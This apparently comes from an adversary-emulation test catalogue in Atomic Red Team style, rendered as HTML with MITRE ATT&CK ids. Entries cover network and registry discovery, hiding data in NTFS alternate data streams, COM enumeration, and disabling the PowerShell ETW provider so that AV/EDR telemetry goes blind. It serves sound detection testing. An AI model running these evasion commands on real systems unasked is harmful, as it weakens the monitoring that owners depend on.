   Get-ChildItem Cert:\LocalMachine\My\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore
   Get-ChildItem Cert:\LocalMachine\Root\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore
}
catch { }</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1553.004</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: f069f0f1-baad-4831-aa2b-eddac4baac4a</li>
<li><strong>name</strong>: System Network Connections Discovery with PowerShell</li>
<li><strong>description</strong>: Get a listing of network connections.</li>
</ul>
<p>Upon successful execution, powershell.exe will execute <code>get-NetTCPConnection</code>. Results will output via stdout.</p>
<ul>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: Get-NetTCPConnection</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1049</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 0045ea16-ed3c-4d4c-a9ee-15e44d1560d1</li>
<li><strong>name</strong>: Create ADS PowerShell</li>
<li>
<p><strong>description</strong>: Create an Alternate Data Stream with PowerShell. Write access is required. To verify execution, the the command "ls -Recurse | %{ gi $_.Fullname -stream *} | where stream -ne ':$Data' | Select-Object pschildname"
in the %temp% direcotry to view all files with hidden data streams. To view the data in the alternate data stream, run "notepad.exe T1564.004_has_ads_powershell.txt:adstest.txt" in the %temp% folder.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: echo "test" &gt; #{file_name} | set-content -path test.txt -stream #{ads_filename} -value "test"
set-content -path #{file_name} -stream #{ads_filename} -value "test2"
set-content -path . -stream #{ads_filename} -value "test3"</p>
</li>
<li>
<p><strong>prereq_command</strong>: if (Test-Path #{file_name}) { exit 0 } else { exit 1 }</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: New-Item -Path #{file_name} | Out-Null</p>
</li>
<li>
<p><strong>cleanup_command</strong>: Remove-Item -Path #{file_name} -ErrorAction Ignore</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1564.004</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 1d5711d6-655c-4a47-ae9c-6503c74fa877</li>
<li><strong>name</strong>: System Time Discovery - PowerShell</li>
<li>
<p><strong>description</strong>: Identify the system time via PowerShell. Upon execution, the system time will be displayed.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: Get-Date</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1124</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 0434d081-bb32-42ce-bcbb-3548e4f2628f</li>
<li><strong>name</strong>: Query Registry with Powershell cmdlets</li>
<li>
<p><strong>description</strong>: Query Windows Registry with Powershell cmdlets, i.e., Get-Item and Get-ChildItem. The results from above can also be achieved with Get-Item and Get-ChildItem.
Unlike using "reg query" which then executes reg.exe, using cmdlets won't generate new processes, which may evade detection systems monitoring process generation. </p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: Get-Item -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows"
Get-ChildItem -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\" | findstr Windows
Get-Item -Path "HKLM:Software\Microsoft\Windows\CurrentVersion\RunServicesOnce"
Get-Item -Path "HKCU:Software\Microsoft\Windows\CurrentVersion\RunServicesOnce"
Get-Item -Path "HKLM:Software\Microsoft\Windows\CurrentVersion\RunServices"
Get-Item -Path "HKCU:Software\Microsoft\Windows\CurrentVersion\RunServices"
Get-Item -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify"
Get-Item -Path "HKLM:Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit"
Get-Item -Path "HKCU:Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell"
Get-Item -Path "HKLM:Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell"
Get-Item -Path "HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad"
Get-Item -Path "HKLM:Software\Microsoft\Windows\CurrentVersion\RunOnce"
Get-Item -Path "HKLM:Software\Microsoft\Windows\CurrentVersion\RunOnceEx"
Get-Item -Path "HKLM:Software\Microsoft\Windows\CurrentVersion\Run"
Get-Item -Path "HKCU:Software\Microsoft\Windows\CurrentVersion\Run"
Get-Item -Path "HKCU:Software\Microsoft\Windows\CurrentVersion\RunOnce"
Get-Item -Path "HKLM:Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"
Get-Item -Path "HKCU:Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"
Get-ChildItem -Path "HKLM:system\currentcontrolset\services" 
Get-Item -Path "HKLM:Software\Microsoft\Windows\CurrentVersion\Run"
Get-Item -Path "HKLM:SYSTEM\CurrentControlSet\Control\SafeBoot"
Get-ChildItem -Path "HKLM:SOFTWARE\Microsoft\Active Setup\Installed Components"
Get-ChildItem -Path "HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Startup"</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1012</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 0d80d088-a84c-4353-af1a-fc8b439f1564</li>
<li><strong>name</strong>: Enumerate COM Objects in Registry with Powershell</li>
<li><strong>description</strong>: This test is designed to enumerate the COM objects listed in HKCR, then output their methods and CLSIDs to a text file.
An adversary could then use this information to identify COM objects that might be vulnerable to abuse, such as using them to spawn arbitrary processes. 
See: https://www.mandiant.com/resources/hunting-com-objects</li>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: New-PSDrive -PSProvider registry -Root HKEY_CLASSES_ROOT -Name HKCR
Get-ChildItem -Path HKCR:\CLSID -Name | Select -Skip 1 &gt; $env:temp\clsids.txt
ForEach($CLSID in Get-Content "$env:temp\clsids.txt")
{try{write-output "$($Position)-$($CLSID)"
write-output "------------"| out-file #{output_file} -append
write-output $($CLSID)| out-file #{output_file} -append
$handle=[activator]::CreateInstance([type]::GetTypeFromCLSID($CLSID))
$handle | get-member -erroraction silentlycontinue | out-file #{output_file} -append
$position += 1} catch{}}</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: remove-item #{output_file} -force -erroraction silentlycontinue
remove-item $env:temp\clsids.txt -force -erroraction silentlycontinue      </p>
</li>
<li>
<p><strong>mitre_id</strong>: T1012</p>
</li>
<li><strong>input_arguments.output_file</strong>: {'description': 'File to output list of COM objects to', 'type': 'string', 'default': '$env:temp\T1592.002Test1.txt'}</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 6f118276-121d-4c09-bb58-a8fb4a72ee84</li>
<li><strong>name</strong>: Disable Powershell ETW Provider - Windows</li>
<li><strong>description</strong>: This test was created to disable the Microsoft Powershell ETW provider by using the built-in Windows tool, logman.exe. This provider is used as a common source of telemetry in AV/EDR solutions.</li>
<li><strong>platforms</strong>: ['windows']</li>
<li><strong>command</strong>: cmd /c "#{ps_exec_location}" -accepteula -i -s cmd.exe /c logman update trace "#{session}" --p "#{provider}" -ets</li>
<li><strong>prereq_command</strong>: if (Test-Path "#{ps_exec_location}") {exit 0} else {exit 1}</li>
<li><strong>get_prereq_command</strong>: New-Item -Type Directory "PathToAtomicsFolder..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "PathToAtomicsFolder..\ExternalPayloads\PStools.zip"
expand-archive -literalpath "PathToAtomicsFolder..\ExternalPayloads\PStools.zip" -destinationpath "PathToAtomicsFolder..\ExternalPayloads\pstools" -force</li>
<li><strong>cleanup_command</strong>: cmd /c "#{ps_exec_location}" -i -s cmd.exe /c logman update trace "#{session}" -p "#{provider}" -ets</li>
<li><strong>mitre_id</strong>: T1562.006</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
